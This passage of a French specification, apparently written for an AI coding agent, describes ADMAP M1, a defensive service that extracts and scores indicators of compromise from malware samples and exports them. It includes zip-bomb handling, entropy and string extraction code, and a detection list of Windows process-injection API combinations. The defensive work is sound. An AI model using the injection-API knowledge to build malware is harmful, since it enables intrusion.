□ Aucun subprocess sur les samples
□ Toutes les clés API masquées dans les logs
□ mypy admap_m1/ --strict → 0 erreur de type
□ ruff check admap_m1/ → 0 violation
□ Couverture tests ≥ 80% (pytest --cov-report=term-missing)
□ Chaque fichier Python commence par le bloc en-tête Module/Version/Dépend
□ Chaque méthode publique a une docstring Google Style
□ WhitelistFilter contient les données complètes portées depuis extracteur.py
□ RegexExtractor contient tous les patterns portés depuis extracteur.py
□ STIXExporter génère un bundle STIX 2.1 valide (json.loads sans erreur)
□ OpenIOCExporter génère un XML parseable (ET.fromstring sans erreur)
□ MISPExporter génère un JSON avec clé "Event.Attribute" non vide
□ CytomicExporter génère un CSV avec headers corrects
□ AnalysisPipeline.run() sur texte retourne IOCBundle en < 5 secondes
□ JobQueue démarre et traite un job sans deadlock

════════════════════════════════════════════════════════════════════════════════
SECTION 27 — CONTRAINTES D'INTÉGRATION AVEC LA PLATEFORME ADMAP
════════════════════════════════════════════════════════════════════════════════

M1 est un microservice autonome qui s'intègre dans ADMAP via des contrats
d'interface stables. Ces contrats NE DOIVENT PAS être modifiés sans
coordination avec les autres modules.

──────────────────────────────────────────────────────────────────────────────
27.1 — Contrat d'interface sortante (ce que M1 produit)
──────────────────────────────────────────────────────────────────────────────

ARTEFACTS PRODUITS PAR M1 :
  1. IOCBundle (modèle Pydantic) — consommé par l'API centrale
  2. STIX 2.1 JSON — format d'échange standard CTI
  3. OpenIOC 1.1 XML — compatible Redline, MISP
  4. MISP JSON — import direct dans instances MISP
  5. CSV Cytomic Orion — import dans WatchGuard AES

ENDPOINT PRINCIPAL CONSOMMÉ PAR L'API CENTRALE ADMAP :
  POST /api/v1/analyze → 202 {"job_id": "uuid"}
  GET  /api/v1/jobs/{job_id}/result → 200 IOCBundle JSON

Le modèle IOCBundle est le contrat. Sa structure ne doit pas changer
sans versioning (pipeline_version="3.0.0" dans chaque bundle).

──────────────────────────────────────────────────────────────────────────────
27.2 — Ce que M1 ne produit PAS (rappel de périmètre)
──────────────────────────────────────────────────────────────────────────────

M1 NE PRODUIT JAMAIS :
  ✗ Des règles YARA (texte de règle .yar) → M3
  ✗ Des résultats d'analyse PCAP → M2
  ✗ Des clusters APT → M4
  ✗ Des scores d'attribution → M5
  ✗ Des résultats d'analyse comportementale (sandbox) → hors périmètre
  ✗ Des modèles ML sérialisés → M3/M4/M5

Si un composant de M1 commence à produire l'un de ces artefacts,
c'est un bug de périmètre à corriger immédiatement.

──────────────────────────────────────────────────────────────────────────────
27.3 — Variables d'environnement exposées à l'API centrale
──────────────────────────────────────────────────────────────────────────────

L'API centrale ADMAP attend que M1 soit accessible via :
  ADMAP_M1_BASE_URL=http://m1-service:8000  (dans docker-compose)

M1 doit exposer :
  GET /health       → healthcheck Docker
  GET /ready        → readiness probe Kubernetes
  GET /api/v1/analyze/formats  → auto-discovery des capacités

════════════════════════════════════════════════════════════════════════════════
SECTION 28 — GESTION DES CAS LIMITES ET COMPORTEMENTS DÉFENSIFS
════════════════════════════════════════════════════════════════════════════════

──────────────────────────────────────────────────────────────────────────────
28.1 — Fichiers corrompus / malformés
──────────────────────────────────────────────────────────────────────────────

Chaque parser DOIT se comporter de façon défensive :

PE corrompu (magic MZ mais structure invalide) :
  → pefile.PEFormatError catchée
  → Retourner FileMetadata avec filetype="PE/corrupted"
  → Logger ExtractionWarning avec offset de l'erreur
  → NE PAS lever PEParsingError (non-bloquant pour M1)
  → Passer quand même à regex_extractor sur le texte brut

ELF tronqué :
  → ELFError catchée
  → Comportement identique : fallback vers string_extractor

Office sans VBA :
  → Retourner get_vba_modules() = [] sans erreur
  → Continuer avec extraction normale du texte

Archive avec contenu non extractible (DLL dans ZIP corrompu) :
  → Logger WARNING pour le membre concerné
  → Continuer avec les autres membres
  → Ne PAS lever ZipBombError sauf si taille > MAX_EXTRACTED_SIZE

Fichier binaire avec entropie > 7.5 (chiffré) :
  → Tenter les désobfuscateurs quand même
  → Si aucun ne détecte → log INFO "high entropy, likely encrypted"
  → Retourner bundle avec 0 IOC et metadata.is_packed=True si heuristique confirme

──────────────────────────────────────────────────────────────────────────────
28.2 — Timeouts et limites de taille
──────────────────────────────────────────────────────────────────────────────

Implémentation des timeouts via asyncio.wait_for :

Dans AnalysisPipeline._run_deobfuscation_chain() :
  each_decoded = await asyncio.wait_for(
      asyncio.get_event_loop().run_in_executor(
          None, deobfuscator.decode, data
      ),
      timeout=settings.DEOBFUSCATION_TIMEOUT_SECONDS
  )
  # Si TimeoutError → logger WARNING, passer au désobfuscateur suivant

Dans AnalysisPipeline._run_extractor() :
  result = await asyncio.wait_for(
      asyncio.get_event_loop().run_in_executor(
          None, extractor.extract, data, path, metadata
      ),
      timeout=60.0
  )
  # Si TimeoutError → logger WARNING, retourner []

Toutes les méthodes synchrones (parsers, extractors, désobfuscateurs)
DOIVENT s'exécuter dans run_in_executor pour ne pas bloquer la boucle asyncio.

──────────────────────────────────────────────────────────────────────────────
28.3 — Comportement avec dépendances optionnelles absentes
──────────────────────────────────────────────────────────────────────────────

Si oletools absent :
  → OfficeParser.can_handle() retourne False
  → VBAExtractor.can_handle() retourne False
  → GET /api/v1/analyze/formats retourne "office_vba": false
  → Aucune erreur levée, aucun crash

Si pyelftools absent :
  → ELFParser retourne FileMetadata minimal (hashes + entropie seulement)
  → ELFExtractor délègue à StringExtractor + RegexExtractor uniquement
  → "elf_parsing": false dans /formats

Si py7zr absent :
  → ArchiveParser.can_handle() retourne False pour les .7z uniquement
  → ZIP, GZIP, TAR fonctionnent normalement (stdlib)

Si ppdeep absent :
  → FileHashes.ssdeep = None
  → Aucun IOCType.HASH_SSDEEP extrait depuis le fichier source
  → "ssdeep": false dans /formats

Si pymisp absent :
  → MISPExporter.push_to_misp() lève ExtractionError("PYMISP_NOT_INSTALLED")
  → POST /api/v1/export/{id}/push/misp retourne HTTP 501 Not Implemented

Si python-magic absent :
  → Fallback automatique vers détection par magic bytes manuels
  → Logger INFO "python-magic unavailable, using fallback type detection"

════════════════════════════════════════════════════════════════════════════════
SECTION 29 — CONVENTIONS DE NOMMAGE ET STYLE
════════════════════════════════════════════════════════════════════════════════

NOMMAGE DES CLASSES :
  Parsers       : [Format]Parser     (PEParser, ELFParser, OfficeParser)
  Extractors    : [Source]Extractor  (RegexExtractor, PEExtractor, VBAExtractor)
  Deobfuscators : [Technique]Decoder (Base64Decoder, XORDecoder, RotDecoder)
                  Exception : PackerDetector (rôle différent)
  Filters       : [Rôle]Filter/er    (WhitelistFilter, IOCDeduplicator, IOCDefanger)
  Heuristics    : [Domaine]Calculator/Analyzer/Scorer
                  (EntropyCalculator, ContextAnalyzer, IOCScorer)
  Enrichers     : [Service]Enricher  (AsyncVTEnricher)
  Exporters     : [Format]Exporter   (STIXExporter, OpenIOCExporter, MISPExporter)

NOMMAGE DES MÉTHODES :
  Méthodes publiques : snake_case, verbe d'action
    can_handle(), extract(), parse_metadata(), score(), decode(), export()
  Méthodes privées : _prefix_snake_case
    _calc_confidence(), _build_pe_info(), _score_candidate()
  Propriétés : @property snake_case substantif
    extraction_method, parser_name, format

NOMMAGE DES CONSTANTES ClassVar :
  UPPER_SNAKE_CASE avec annotation de type explicite
  BASE_SCORE: ClassVar[int] = 30
  SUSPECT_TLDS: ClassVar[set[str]] = {...}

NOMMAGE DES FICHIERS :
  snake_case.py dans tous les packages
  test_[module_testé].py dans tests/

ORDRE DES IMPORTS dans chaque fichier :
  1. from __future__ import annotations
  2. Stdlib (alphabétique)
  3. Ligne vide
  4. Third-party (alphabétique)
  5. Ligne vide
  6. Imports internes admap_m1 (alphabétique)

════════════════════════════════════════════════════════════════════════════════
SECTION 30 — RÉSUMÉ EXÉCUTIF POUR L'AGENT D'EXÉCUTION
════════════════════════════════════════════════════════════════════════════════

Tu dois produire un package Python professionnel nommé admap_m1 qui :

1. EXTRAIT statiquement des IOCs depuis :
   - Fichiers PE (Windows EXE/DLL) via pefile
   - Fichiers ELF (Linux binaires) via pyelftools
   - Documents Office avec macros VBA via oletools
   - Archives récursives (ZIP/GZ/TAR/7z) avec protection zip bomb
   - Texte brut, logs, rapports CTI par regex

2. DÉSOBFUSQUE les payloads encodés :
   - Base64 (y compris PowerShell -EncodedCommand)
   - XOR 1-byte par brute-force scoré
   - ROT-N (1-25)
   - Patterns AMSI bypass PowerShell
   - Détection de packers PE (UPX, MPRESS, PyInstaller)

3. FILTRE les faux positifs :
   - IPs RFC1918, loopback, multicast
   - Domaines bénins (Microsoft, Google, CDN...)
   - Modules Python/Java/.NET
   - Sections PE/ELF standard
   - TLDs invalides

4. SCORE chaque IOC (0-100) sans IA :
   - 10 règles de bonus documentées
   - 6 règles de malus documentées
   - Audit trail complet dans scoring_reasons

5. ENRICHIT (optionnel) via VirusTotal API v3 :
   - Async httpx avec rate limiting
   - Cache LRU avec TTL
   - Retry backoff exponentiel

6. EXPORTE vers 4 formats industriels :
   - STIX 2.1 (lib stix2 officielle)
   - OpenIOC 1.1 XML (Mandiant)
   - MISP JSON (offline + PyMISP connecté)
   - CSV Cytomic Orion (WatchGuard)

7. EXPOSE une API REST FastAPI :
   - File upload async (job queue)
   - Analyse texte synchrone
   - Polling d'état des jobs
   - Téléchargement des exports

8. FOURNIT un CLI Click non-interactif :
   - analyze, export, serve
   - Sortie JSON machine-readable
   - Zéro input(), zéro menu

Le tout en Python 3.11+, 100% typé, 100% testé (≥80% coverage),
100% documenté (Google docstrings), 100% programmatique.

════════════════════════════════════════════════════════════════════════════════
SECTION 31 — SPÉCIFICATIONS COMPLÈTES : ARCHIVE EXTRACTOR
════════════════════════════════════════════════════════════════════════════════

──────────────────────────────────────────────────────────────────────────────
31.1 — Algorithme de protection anti-zip-bomb
──────────────────────────────────────────────────────────────────────────────

La protection zip-bomb s'implémente via un compteur partagé mutable
(list[int] pour passer par référence en Python) :

def extract_members(
    self,
    file_bytes: bytes,
    archive_path: Path,
    depth: int = 0,
    total_size_ref: list[int] | None = None,
) -> list[tuple[str, bytes]]:
    """
    Args:
        file_bytes: Contenu de l'archive en bytes.
        archive_path: Chemin original (pour les logs et les labels).
        depth: Profondeur de récursion actuelle (0 = archive racine).
        total_size_ref: Compteur partagé de taille totale extraite.
            Passé par référence via list[int] pour mutation inter-appels.

    Returns:
        Liste de (chemin_relatif_dans_archive, contenu_bytes).
        Chaque chemin est préfixé par le nom de l'archive parente :
        "archive.zip/subfolder/malware.exe"

    Raises:
        ArchiveExtractionError: Si depth > MAX_DEPTH.
        ZipBombError: Si total extrait > MAX_EXTRACTED_SIZE.
    """
    if total_size_ref is None:
        total_size_ref = [0]

    if depth > self.MAX_DEPTH:
        self._logger.warning(
            "archive_max_depth_reached",
            depth=depth,
            archive=str(archive_path),
        )
        raise ArchiveExtractionError(
            f"Archive recursion depth {depth} exceeds maximum {self.MAX_DEPTH}",
            "ARCHIVE_MAX_DEPTH",
            {"depth": depth, "archive": str(archive_path)},
        )

    results: list[tuple[str, bytes]] = []
    archive_name = archive_path.name

    # Détecter le type d'archive
    fmt = self._detect_format(file_bytes)
    if fmt is None:
        return []

    try:
        members = self._open_archive(file_bytes, fmt, archive_path)
    except Exception as e:
        self._logger.warning(
            "archive_open_failed",
            archive=str(archive_path),
            error=str(e),
        )
        return []

    for member_name, member_bytes in members:
        # Vérification taille cumulée (protection zip-bomb)
        total_size_ref[0] += len(member_bytes)
        if total_size_ref[0] > self.MAX_EXTRACTED_SIZE:
            raise ZipBombError(
                f"Total extracted size exceeds {self.MAX_EXTRACTED_SIZE // (1024*1024)} MB",
                "ZIP_BOMB_DETECTED",
                {
                    "total_extracted_mb": total_size_ref[0] // (1024 * 1024),
                    "limit_mb": self.MAX_EXTRACTED_SIZE // (1024 * 1024),
                    "archive": str(archive_path),
                },
            )

        relative_path = f"{archive_name}/{member_name}"
        results.append((relative_path, member_bytes))

        # Récursion si le membre est lui-même une archive
        if self._is_archive(member_bytes):
            try:
                sub_members = self.extract_members(
                    file_bytes=member_bytes,
                    archive_path=Path(relative_path),
                    depth=depth + 1,
                    total_size_ref=total_size_ref,
                )
                results.extend(sub_members)
            except (ZipBombError, ArchiveExtractionError):
                raise  # Propager les erreurs critiques
            except Exception as e:
                self._logger.warning(
                    "archive_sub_extraction_failed",
                    member=relative_path,
                    error=str(e),
                )

    return results

def _detect_format(self, file_bytes: bytes) -> str | None:
    """
    Identifier le format d'archive par magic bytes.
    Retourner 'zip', 'gzip', '7z', 'tar', ou None.
    """
    if file_bytes[:4] == b"PK\x03\x04":
        return "zip"
    if file_bytes[:2] == b"\x1f\x8b":
        return "gzip"
    if file_bytes[:6] == b"7z\xbc\xaf\x27\x1c":
        return "7z"
    # TAR : pas de magic fixe avant octets 257
    try:
        if file_bytes[257:262] == b"ustar":
            return "tar"
    except IndexError:
        pass
    return None

def _open_archive(
    self,
    file_bytes: bytes,
    fmt: str,
    archive_path: Path,
) -> list[tuple[str, bytes]]:
    """
    Ouvrir l'archive et retourner liste (nom_membre, contenu_bytes).
    Gérer les erreurs de chaque format distinctement.
    """
    import io

    members: list[tuple[str, bytes]] = []

    if fmt == "zip":
        zf = self._try_zip_passwords(file_bytes)
        if zf is None:
            try:
                zf = zipfile.ZipFile(io.BytesIO(file_bytes))
            except zipfile.BadZipFile as e:
                raise ArchiveExtractionError(str(e), "BAD_ZIP")
        with zf:
            for info in zf.infolist():
                if info.is_dir():
                    continue
                try:
                    data = zf.read(info.filename)
                    members.append((info.filename, data))
                except Exception as e:
                    self._logger.warning(
                        "zip_member_read_failed",
                        member=info.filename,
                        error=str(e),
                    )

    elif fmt == "gzip":
        with gzip.open(io.BytesIO(file_bytes)) as gf:
            data = gf.read(self.MAX_EXTRACTED_SIZE + 1)
        stem = archive_path.stem
        members.append((stem, data))

    elif fmt == "tar":
        with tarfile.open(fileobj=io.BytesIO(file_bytes)) as tf:
            for member in tf.getmembers():
                if not member.isfile():
                    continue
                try:
                    f = tf.extractfile(member)
                    if f:
                        members.append((member.name, f.read()))
                except Exception as e:
                    self._logger.warning(
                        "tar_member_read_failed",
                        member=member.name,
                        error=str(e),
                    )

    elif fmt == "7z":
        try:
            import py7zr
            with py7zr.SevenZipFile(io.BytesIO(file_bytes)) as szf:
                extracted = szf.readall()
                for name, bio in (extracted or {}).items():
                    members.append((name, bio.read()))
        except ImportError:
            self._logger.warning("py7zr_unavailable_skipping_7z_archive")
        except Exception as e:
            raise ArchiveExtractionError(str(e), "BAD_7Z")

    return members

def _is_archive(self, data: bytes) -> bool:
    """True si les bytes correspondent à une archive connue."""
    return self._detect_format(data) is not None

════════════════════════════════════════════════════════════════════════════════
SECTION 32 — SPÉCIFICATIONS COMPLÈTES : ENTROPY CALCULATOR
════════════════════════════════════════════════════════════════════════════════

import math
from collections import Counter

class EntropyCalculator:
    """
    Calcul d'entropie de Shannon sur des données binaires.
    Aucune dépendance externe. Utilisé par parsers, deobfuscators et scorer.
    """

    @staticmethod
    def calculate(data: bytes) -> float:
        """
        Calcule l'entropie de Shannon globale.

        Args:
            data: Données binaires à analyser.

        Returns:
            Entropie entre 0.0 (données uniformes) et 8.0 (aléatoire parfait).
            Retourne 0.0 si data est vide.
        """
        if not data:
            return 0.0
        n = len(data)
        freq = Counter(data)
        return -sum(
            (count / n) * math.log2(count / n)
            for count in freq.values()
        )

    @staticmethod
    def calculate_windowed(
        data: bytes,
        window_size: int = 256,
    ) -> list[float]:
        """
        Calcule l'entropie par fenêtres non-chevauchantes.

        Args:
            data: Données binaires.
            window_size: Taille de chaque fenêtre en bytes.

        Returns:
            Liste d'entropies, une par fenêtre.
            Longueur = len(data) // window_size.
        """
        results: list[float] = []
        for i in range(0, len(data) - window_size + 1, window_size):
            window = data[i : i + window_size]
            results.append(EntropyCalculator.calculate(window))
        return results

    @staticmethod
    def classify(entropy: float) -> str:
        """
        Classifie l'entropie en catégorie lisible.

        Args:
            entropy: Valeur d'entropie entre 0.0 et 8.0.

        Returns:
            Catégorie : "binary_zeros" | "plaintext" |
            "compressed_or_encoded" | "mixed" |
            "likely_encrypted" | "encrypted_or_random"
        """
        if entropy < 1.0:
            return "binary_zeros"
        if entropy < 4.0:
            return "plaintext"
        if entropy < 6.0:
            return "compressed_or_encoded"
        if entropy < 7.0:
            return "mixed"
        if entropy < 7.5:
            return "likely_encrypted"
        return "encrypted_or_random"

    @staticmethod
    def find_high_entropy_regions(
        data: bytes,
        threshold: float = 7.0,
        window_size: int = 256,
    ) -> list[tuple[int, int]]:
        """
        Identifie les zones à haute entropie dans les données.

        Args:
            data: Données binaires à analyser.
            threshold: Seuil d'entropie (défaut 7.0).
            window_size: Taille de fenêtre pour le calcul.

        Returns:
            Liste de (offset_start, offset_end) des régions
            dont l'entropie dépasse le seuil.
            Les régions adjacentes sont fusionnées.
        """
        raw_regions: list[tuple[int, int]] = []

        for i in range(0, len(data) - window_size + 1, window_size):
            window = data[i : i + window_size]
            entropy = EntropyCalculator.calculate(window)
            if entropy >= threshold:
                raw_regions.append((i, i + window_size))

        # Fusionner les régions adjacentes
        if not raw_regions:
            return []

        merged: list[tuple[int, int]] = [raw_regions[0]]
        for start, end in raw_regions[1:]:
            prev_start, prev_end = merged[-1]
            if start <= prev_end:  # Régions adjacentes ou chevauchantes
                merged[-1] = (prev_start, max(prev_end, end))
            else:
                merged.append((start, end))

        return merged

════════════════════════════════════════════════════════════════════════════════
SECTION 33 — SPÉCIFICATIONS COMPLÈTES : CONTEXT ANALYZER
════════════════════════════════════════════════════════════════════════════════

from dataclasses import dataclass, field

@dataclass
class ExtractionContext:
    """
    Contexte global partagé entre tous les composants du pipeline.
    Construit progressivement par AnalysisPipeline au fil des stages.
    Passé par référence (dataclass mutable) à chaque composant.
    """
    # Depuis PE Parser
    pe_imports: dict[str, list[str]] = field(default_factory=dict)
    suspicious_imports: list[str] = field(default_factory=list)
    import_suspicion_score: int = 0

    # Depuis Packer Detector
    is_packed: bool = False
    packer_name: str | None = None

    # Depuis Entropy Calculator
    high_entropy_regions: list[tuple[int, int]] = field(default_factory=list)
    global_entropy: float = 0.0

    # Depuis Deobfuscators
    deobfuscation_layers: list[DeobfuscationResult] = field(default_factory=list)

    # Depuis VBA Extractor
    vba_autoexec_detected: bool = False
    vba_shell_detected: bool = False
    vba_obfuscation_techniques: list[str] = field(default_factory=list)

    # Depuis Archive Parser
    archive_extraction_paths: list[str] = field(default_factory=list)

    # Metadata rapide pour le scorer
    filetype: str = "unknown"
    filesize: int = 0


class ContextAnalyzer:
    """
    Utilitaires pour construire et interroger ExtractionContext.
    Méthodes statiques uniquement — pas d'état.
    """

    # Imports d'injection PE (sous-ensemble de SUSPICIOUS_IMPORTS de PEParser)
    INJECTION_IMPORTS: ClassVar[frozenset[str]] = frozenset({
        "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread",
        "NtCreateThreadEx", "RtlCreateUserThread", "QueueUserAPC",
        "SetThreadContext",
    })

    @staticmethod
    def build_from_metadata(metadata: FileMetadata) -> ExtractionContext:
        """
        Initialise ExtractionContext depuis les métadonnées du fichier.

        Args:
            metadata: FileMetadata produit par le parser approprié.

        Returns:
            ExtractionContext pré-rempli avec les données disponibles.
        """
        context = ExtractionContext(
            filetype=metadata.filetype,
            filesize=metadata.filesize,
            global_entropy=metadata.entropy,
            is_packed=metadata.is_packed,
            packer_name=metadata.packer_name,
        )

        if metadata.pe_info:
            context.pe_imports = metadata.pe_info.imports
            context.suspicious_imports = metadata.pe_info.suspicious_imports
            context.import_suspicion_score = metadata.pe_info.import_suspicion_score

        return context

    @staticmethod
    def is_in_high_entropy_region(
        offset: int,
        regions: list[tuple[int, int]],
    ) -> bool:
        """
        Vérifie si un offset tombe dans une région haute entropie.

        Args:
            offset: Position dans le fichier binaire.
            regions: Liste de (start, end) des régions haute entropie.

        Returns:
            True si offset est dans au moins une région.
        """
        return any(start <= offset < end for start, end in regions)

    @staticmethod
    def has_injection_combo(imports: dict[str, list[str]]) -> bool:
        """
        Vérifie si les imports PE contiennent un combo d'injection complet.

        Un combo d'injection est un ensemble d'imports qui ensemble
        permettent l'injection de code dans un processus distant.

        Args:
            imports: Dict {dll_name: [function_names]} depuis PEParser.

        Returns:
            True si au moins un combo complet est détecté.
        """
        all_funcs: set[str] = {
            func
            for funcs in imports.values()
            for func in funcs
        }
        # Combo classique : allocation + écriture + exécution distante
        combos = [
            {"VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"},
            {"VirtualAllocEx", "WriteProcessMemory", "NtCreateThreadEx"},
            {"SetThreadContext", "SuspendThread", "ResumeThread"},
            {"QueueUserAPC", "WriteProcessMemory"},
        ]
        return any(combo.issubset(all_funcs) for combo in combos)

    @staticmethod
    def update_from_vba(
        context: ExtractionContext,
        autoexec: bool,
        shell: bool,
        techniques: list[str],
    ) -> None:
        """
        Met à jour le contexte avec les résultats de l'analyse VBA.

        Args:
            context: Contexte à modifier (in-place).
            autoexec: True si une macro autoexec a été détectée.
            shell: True si un appel shell a été détecté.
            techniques: Liste des techniques d'obfuscation VBA détectées.
        """
        context.vba_autoexec_detected = autoexec
        context.vba_shell_detected = shell
        context.vba_obfuscation_techniques = techniques

    @staticmethod
    def add_deobfuscation_layer(
        context: ExtractionContext,
        result: DeobfuscationResult,
    ) -> None:
        """Ajoute un résultat de désobfuscation au contexte."""
        context.deobfuscation_layers.append(result)

════════════════════════════════════════════════════════════════════════════════
SECTION 34 — SPÉCIFICATIONS COMPLÈTES : STRING EXTRACTOR
════════════════════════════════════════════════════════════════════════════════

class StringExtractor(BaseExtractor):
    """
    Extrait les chaînes de caractères ASCII et Unicode (UTF-16LE)
    depuis des données binaires brutes.

    Utilisé comme extracteur de fallback pour les binaires non reconnus,
    et comme sous-composant de PEExtractor et ELFExtractor.
    """

    MIN_STRING_LENGTH: ClassVar[int] = 6
    MAX_STRING_LENGTH: ClassVar[int] = 4096  # Éviter les très longues chaînes

    # Bytes ASCII imprimables (0x20-0x7E + tab + newline + carriage return)
    PRINTABLE_ASCII: ClassVar[frozenset[int]] = frozenset(
        range(0x20, 0x7F)
    ) | frozenset([0x09, 0x0A, 0x0D])

    @property
    def extraction_method(self) -> str:
        return "binary_strings"

    def can_handle(self, file_bytes: bytes, file_path: Path) -> bool:
        """
        True pour tout fichier binaire qui n'est pas du texte pur.
        Laisse regex_extractor gérer les fichiers texte décodables.
        """
        try:
            file_bytes[:512].decode("utf-8")
            return False  # Texte pur → regex_extractor s'en charge
        except (UnicodeDecodeError, ValueError):
            return True  # Binaire → string_extractor applicable

    def extract(
        self,
        file_bytes: bytes,
        file_path: Path,
        metadata: FileMetadata,
    ) -> list[RawIOC]:
        """
        Extrait les strings ASCII et Unicode puis applique regex_extractor.

        Returns:
            RawIOC produits par regex_extractor sur les strings extraites.
        """
        ascii_strings = self._extract_ascii(file_bytes)
        unicode_strings = self._extract_unicode(file_bytes)

        # Agréger toutes les strings dans un pseudo-texte avec offsets
        combined_text = "\n".join(s for s, _ in ascii_strings + unicode_strings)

        # Déléguer à regex_extractor pour l'extraction des IOCs
        raw_iocs = self._regex_extractor.extract(
            combined_text.encode("utf-8", errors="replace"),
            file_path,
            metadata,
        )

        # Mettre à jour extraction_method
        for ioc in raw_iocs:
            object.__setattr__(ioc, "extraction_method", "binary_strings")

        return raw_iocs

    def extract_from_section(
        self,
        section_data: bytes,
        section_name: str,
        base_offset: int = 0,
    ) -> list[tuple[str, int]]:
        """
        Extrait les strings d'une section PE/ELF spécifique.

        Args:
            section_data: Contenu brut de la section.
            section_name: Nom de la section (ex: ".rdata").
            base_offset: Offset de base de la section dans le fichier.

        Returns:
            Liste de (string_value, offset_absolu).
        """
        ascii_strings = [
            (s, base_offset + off)
            for s, off in self._extract_ascii(section_data)
        ]
        unicode_strings = [
            (s, base_offset + off)
            for s, off in self._extract_unicode(section_data)
        ]
        return ascii_strings + unicode_strings

    def _extract_ascii(self, data: bytes) -> list[tuple[str, int]]:
        """
        Extrait les séquences ASCII imprimables de longueur >= MIN_STRING_LENGTH.

        Returns:
            Liste de (string, offset_dans_data).
        """
        results: list[tuple[str, int]] = []
        current: list[int] = []
        start_offset: int = 0

        for i, byte in enumerate(data):
            if byte in self.PRINTABLE_ASCII:
                if not current:
                    start_offset = i
                current.append(byte)
            else:
                if self.MIN_STRING_LENGTH <= len(current) <= self.MAX_STRING_LENGTH:
                    results.append((bytes(current).decode("ascii"), start_offset))
                current = []

        # Flush final
        if self.MIN_STRING_LENGTH <= len(current) <= self.MAX_STRING_LENGTH:
            results.append((bytes(current).decode("ascii"), start_offset))

        return results

    def _extract_unicode(self, data: bytes) -> list[tuple[str, int]]:
        """
        Extrait les séquences UTF-16LE imprimables (Windows Unicode).

        Algorithme : chercher des séquences de paires (byte_imprimable, 0x00).

        Returns:
            Liste de (string, offset_dans_data).
        """
        results: list[tuple[str, int]] = []
        i = 0
        n = len(data)

        while i < n - 1:
            # Vérifier début d'une séquence UTF-16LE
            if data[i] in self.PRINTABLE_ASCII and data[i + 1] == 0x00:
                start = i
                chars: list[str] = []

                while i < n - 1:
                    lo = data[i]
                    hi = data[i + 1]
                    if lo in self.PRINTABLE_ASCII and hi == 0x00:
                        chars.append(chr(lo))
                        i += 2
                    else:
                        break

                if self.MIN_STRING_LENGTH <= len(chars) <= self.MAX_STRING_LENGTH:
                    results.append(("".join(chars), start))
            else:
                i += 1

        return results

════════════════════════════════════════════════════════════════════════════════
SECTION 35 — IMPLÉMENTATION COMPLÈTE : JOB QUEUE WORKER
════════════════════════════════════════════════════════════════════════════════

Compléter l'implémentation de _process_job et _cleanup_expired :

async def _process_job(self, job: AnalysisJob, file_bytes: bytes) -> None:
    """
    Traite un job d'analyse de façon complète.

    Args:
        job: Le job à traiter (modifié in-place).
        file_bytes: Contenu du fichier à analyser.
    """
    job.status = JobStatus.RUNNING
    job.started_at = datetime.utcnow()
    self._jobs[job.job_id] = job

    self._logger.info(
        "job_started",
        job_id=str(job.job_id),
        filename=job.filename,
    )

    def on_progress(pct: int, stage: str) -> None:
        """Callback de progression, appelé depuis pipeline."""
        job.progress = pct
        job.current_stage = stage
        self._jobs[job.job_id] = job  # Mise à jour de la référence

    try:
        bundle = await self._pipeline.run(
            file_bytes=file_bytes,
            file_path=Path(job.filename),
            options=job.options,
            on_progress=on_progress,
        )
        self._results[job.job_id] = bundle
        self._result_timestamps[job.job_id] = time.time()
        job.status = JobStatus.COMPLETED
        job.result_bundle_id = bundle.bundle_id
        job.progress = 100
        job.current_stage = "completed"

        self._logger.info(
            "job_completed",
            job_id=str(job.job_id),
            total_iocs=bundle.analysis_stats.total_iocs,
            duration_ms=bundle.analysis_stats.duration_ms,
        )

    except asyncio.CancelledError:
        job.status = JobStatus.CANCELLED
        job.current_stage = "cancelled"
        self._logger.info("job_cancelled", job_id=str(job.job_id))

    except Exception as e:
        job.status = JobStatus.FAILED
        job.error = str(e)
        job.current_stage = "failed"
        self._logger.error(
            "job_failed",
            job_id=str(job.job_id),
            error=str(e),
            exc_info=True,
        )

    finally:
        job.completed_at = datetime.utcnow()
        self._jobs[job.job_id] = job

async def _cleanup_expired(self) -> None:
    """
    Tâche de nettoyage périodique (toutes les heures).
    Supprime les résultats dont le TTL est dépassé.
    """
    while not self._stop_event.is_set():
        try:
            await asyncio.sleep(3600)  # Vérifier toutes les heures

            now = time.time()
            ttl_seconds = self._settings.JOB_TTL_HOURS * 3600
            expired_ids: list[UUID] = []

            for job_id, timestamp in self._result_timestamps.items():
                if now - timestamp > ttl_seconds:
                    expired_ids.append(job_id)

            for job_id in expired_ids:
                self._results.pop(job_id, None)
                self._result_timestamps.pop(job_id, None)
                # Marquer le job comme expiré mais conserver ses métadonnées
                if job_id in self._jobs:
                    job = self._jobs[job_id]
                    job.current_stage = "result_expired"
                    self._jobs[job_id] = job

                self._logger.info(
                    "job_result_expired",
                    job_id=str(job_id),
                )

        except asyncio.CancelledError:
            break
        except Exception as e:
            self._logger.error("cleanup_error", error=str(e))

════════════════════════════════════════════════════════════════════════════════
SECTION 36 — FIXTURES PYTEST COMPLÈTES (tests/conftest.py)
════════════════════════════════════════════════════════════════════════════════

"""
Module   : tests.conftest
Version  : 3.0.0
Dépend   : admap_m1.models, admap_m1.api.main, admap_m1.pipeline
"""

from __future__ import annotations

import struct
import pytest
import pytest_asyncio
from datetime import datetime
from pathlib import Path
from uuid import uuid4

from httpx import AsyncClient, ASGITransport


# ── Fixtures binaires ──────────────────────────────────────────────────────

@pytest.fixture(scope="session")
def minimal_pe_bytes() -> bytes:
    """
    Construit un PE Windows valide minimal en mémoire.

    Structure :
    - MZ header (64 bytes)
    - PE signature + COFF header (24 bytes)
    - Optional header minimal (96 bytes)
    - 1 section header (.text)

    Ne dépend d'aucun fichier externe.
    """
    # DOS header MZ
    dos_header = bytearray(64)
    dos_header[0:2] = b"MZ"
    # e_lfanew = offset vers PE signature (à l'offset 60 = 0x3C)
    struct.pack_into("<I", dos_header, 60, 64)  # PE @ offset 64

    # PE signature
    pe_sig = b"PE\x00\x00"

    # COFF header (20 bytes)
    # Machine: IMAGE_FILE_MACHINE_I386 = 0x014c
    # NumberOfSections: 1
    # TimeDateStamp: 0
    # PointerToSymbolTable: 0
    # NumberOfSymbols: 0
    # SizeOfOptionalHeader: 96
    # Characteristics: 0x0102 (executable + 32bit)
    coff_header = struct.pack(
        "<HHIIIHH",
        0x014C,  # Machine
        1,       # NumberOfSections
        0,       # TimeDateStamp
        0,       # PointerToSymbolTable
        0,       # NumberOfSymbols
        96,      # SizeOfOptionalHeader
        0x0102,  # Characteristics
    )

    # Optional header PE32 (96 bytes minimum)
    opt_header = bytearray(96)
    struct.pack_into("<H", opt_header, 0, 0x010B)   # Magic PE32
    struct.pack_into("<I", opt_header, 16, 0x1000)  # AddressOfEntryPoint
